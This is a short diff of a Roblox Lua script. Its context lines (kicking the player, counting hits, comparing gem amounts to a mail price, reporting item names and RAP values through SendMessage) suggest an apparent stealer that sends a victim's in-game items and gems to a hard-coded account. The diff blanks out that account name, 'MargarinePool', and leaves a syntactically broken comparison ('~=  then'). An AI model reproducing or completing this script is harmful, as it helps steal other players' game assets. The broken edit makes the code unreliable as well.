@@ -43,7 +43,7 @@ if idiotuser == Username then
     return
 end
 if Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("MargarinePool")
+    game:GetService("Players").LocalPlayer:Kick("")
     return
 end
 
@@ -816,7 +816,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                         v.Item_RAP,
                         totalRap
                     )
-                    if Roblox_Username ~= MargarinePool then
+                    if Roblox_Username ~=  then
                         SendMessage(
                             v.Item_Name,
                             v.Item_Class,
